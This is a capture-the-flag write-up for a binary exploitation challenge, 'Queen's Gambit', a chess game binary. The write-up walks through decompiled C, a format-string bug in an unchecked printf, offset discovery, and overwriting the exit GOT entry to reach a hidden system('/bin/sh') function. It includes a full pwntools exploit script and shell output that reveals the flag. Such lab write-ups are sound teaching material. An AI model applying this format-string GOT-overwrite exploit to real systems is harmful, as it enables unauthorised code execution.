# **Queen's Gambit**
## Task
nc challenges.ctfd.io 30458
File: chess
Tag: binary exploitation

## Solution

### Checksec 
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
* No Canary found assume BOF
* System 64 bit
* No Pie assume to overwrite GOT

### Load file in IDA pro 
With IDA pro, it helped us to define the `main`
## Pseudocode C main
```c
int __fastcall main(int a1, char **a2, char **a3)
{
  size_t v3; // rax
  size_t v4; // rax
  int result; // eax
  int v6; // [rsp+Ch] [rbp-C4h] BYREF
  char src[24]; // [rsp+10h] [rbp-C0h] BYREF
  char s[8]; // [rsp+28h] [rbp-A8h] BYREF
  char dest[160]; // [rsp+30h] [rbp-A0h] BYREF

  puts("\n================================================================");
  puts("                Q U E E N ' S    G A M B I T                    ");
  puts("================================================================\n");
  puts("                              ()    ");
  puts("                           .-:--:-. ");
  puts("                            \\____/  ");
  puts("                            {====}  ");
  puts("                             )__(   ");
  puts("                            /____\\  ");
  puts("                             |  |   ");
  puts("                            /____\\  ");
  puts("                           (======) ");
  puts("                           }======{ ");
  puts("                          (________)");
  puts("\n================================================================");
  puts("\nChess puzzles to train you brain.\nBecome a Grand Master.\n");
  puts("================================================================\n\n");
  puts("1) Play");
  puts("2) Chess Server Admin");
  puts("3) Quit");
  printf("\n>> ");
  fgets(s, 8, stdin);
  __isoc99_sscanf(s, "%d", &v6);
  if ( v6 == 1 )
  {
    printf("Enter your name:\n>> ");
    fgets(src, 16, stdin);
    src[strlen(src) - 1] = 0;
    sub_40122C();
    strcpy(&dest[strlen(dest)], "\nCongratulations ");
    strcat(dest, src);
    strcpy(&dest[strlen(dest)], "! Your answer was correct!\n\nYour winning move was: \n");
    strcat(dest, ::src);
    printf(dest);
    v3 = strlen(dest);
    memset(dest, 0, v3);
    sub_40142C();
    strcpy(&dest[strlen(dest)], "\nCongratulations ");
    strcat(dest, src);
    strcpy(&dest[strlen(dest)], "! Your answer was correct!\n\nYour winning move was: \n");
    strcat(dest, ::src);
    printf(dest);
    v4 = strlen(dest);
    memset(dest, 0, v4);
    sub_4015F9();
    strcpy(&dest[strlen(dest)], "\nCongratulations ");
    strcat(dest, src);
    strcpy(&dest[strlen(dest)], "!\nThat was the final puzzle!!!\n\nYour Winning moves was: \n");
    strcat(dest, ::src);
    printf(dest);
    result = puts("\n\nYou defeated the Borgovotron!\nKeep training and you'll be a Grand Master in no time!!!\n");
  }
  else
  {
    if ( v6 == 2 )
      sub_4011F5();
    result = puts("\nQuitting!");
  }
  return result;
}
```
In totally, it is a chess game which has 3 round
Read the source we can easily win the game with steps respectively respond to "Ra1" "Qg7" "Kd2" input. But this challenge is not easy like that :)

## After win the game we got not thing
```bash
Congratulations iXz!
That was the final puzzle!!!

Your Winning moves was:
Kd2


You defeated the Borgovotron!
Keep training and you'll be a Grand Master in no time!!!
```
 Then keep on examining the source in IDA 
 In the Strings window, I have found out the interest string "/bin/sh" :))
 ![](Strings.png)
 I got the shell func at `0x4011C2` address

 ```c
 int sub_4011C2()
{
  printf("Welcome, Mr Shaibel...\n\n#");
  fflush(stdout);
  return system("/bin/sh");
}
```
Then I focus on overwrite the return address and overwrite GOT table
Another noticeble bug is `printf(dest)` without format string -> format string exploit

Finally, I was win this challenge by overwrite GOT `exit` through format string vulnability

Easy to call the `exit` by input wrong step, so We have to overwrite the exit with the shell func then set wrong input to WIN

```c
  fgets(src, 128, stdin);
  __isoc99_sscanf(src, "%s", s1);
  result = strcmp(s1, "Ra1");
```

the author use the `sscanf` and `strcmp` to check step move input. Both of the functions inorge the space character. Therefore, it's easy for us to set format string payload after the space

# However, First I have to find the offset of format string

```bash
$ python -c "print('1\n'+'AABB\n'+'Ra1 ' +'%x.'*40 + '\nQg7'+'\nKd2\n')" > Input.txt
$ ./chess < Input.txt
```

```bash
Congratulations AABB! Your answer was correct!

Your winning move was:
Ra1 4041e0.1d.60.0.ffffe070.0.0.42424141.0.0.a31.6e6f430a.74616c75.42414120.2072756f.77207265.6572726f.756f590a.6e696e6e.77206576.3161520a.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.f7e177cf.0.41f8d1f4.4010e0.
```

`42424141` -> offset is 8
```bash
 ► 0x401a67    mov    eax, 0
   0x401a6c    call   printf@plt <printf@plt>
   ....
pwndbg> x/xg 0x404068
0x404068 <exit@got.plt>:        0x00000000004010d6
```
shell func has address : `0x4011c2`. we just have to overwrite 2 head bytes and 0x40 tail are the same both
`payload = "Ra1 %4470x%8$n"`. `4470` is mean 0x11c2(4556) = 4470 + 76 -> 76 byte which was already written out 

# After the `printf` instruction
```bash
   0x401a6c    call   printf@plt <printf@plt>
 ► 0x401a71    lea    rax, [rbp - 0xa0]
 pwndbg> x/xg 0x404068
 0x404068 <exit@got.plt>:        0x00000000004011c2
```
`got.exit` was overwritten !!

### Script python using pwntool
```python
from pwn import *

binary = context.binary = ELF('./chess')

p = remote('challenges.ctfd.io', 30458)
#p = process(binary.path)
# "\x68\x40\x40A\x00\x00\x00\x00\x00B" is p64(binary.sym.got.exit)
p.sendline("1")
p.sendlineafter("Enter your name", "\x68\x40\x40A\x00\x00\x00\x00\x00B")

# send payload format string
p.sendlineafter("h1", b"Ra1 %4470x%8$hn")

# send wrong step move to call got.exit()
p.sendlineafter("- Qg7", "Qg8")

# maintain shell
p.interactive()
```


### Output

```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenges.ctfd.io on port 30458: Done
[*] Switching to interactive mode


>>
Incorrect!!
Welcome, Mr Shaibel...

#/bin/sh: 0: can't access tty; job control turned off
# $ ls
bin  chess  dev  flag.txt  lib    lib32  lib64
$ cat flag.txt
# flag{And_y0u_didnt_ev3n_n33d_th3_pills}
```

